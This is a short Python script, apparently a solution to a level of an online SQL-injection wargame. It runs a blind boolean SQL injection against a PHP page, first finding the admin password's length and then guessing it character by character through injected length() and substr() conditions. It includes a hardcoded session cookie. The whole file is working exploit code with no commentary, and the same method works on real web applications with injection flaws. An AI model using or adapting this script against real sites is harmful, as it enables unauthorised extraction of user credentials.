import requests
import urllib

url="http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
session = dict(PHPSESSID="oq28ofq8rpnsplo6ebu3em7p84")

pw=""
p_length=0

print("[*] START")

print("[*] find password's length")

for i in range(0,30):
	try:
		query=url+"1'||id='admin' %26%26 length(pw)="+str(i)+"%23"
		r=requests.post(query,cookies=session)
	except:
		print("[*] exception")
		continue

	if "Hello admin" in r.text:
		p_length=i
		break

print("[*] password length: ",p_length)

print("[*] find password")

for j in range(1,p_length+1):
	for i in range(48,128):
		try:
			query=url+"1'||id='admin'%26%26substr(pw,"+str(j)+",1)='"+chr(i)
			r=requests.post(query,cookies=session)
		except:
			print("[*] exception")
			continue

		if "Hello admin" in r.text:
			pw+=chr(i)
			print("[*] find : ",pw)
			break

print("[*] password : ",pw)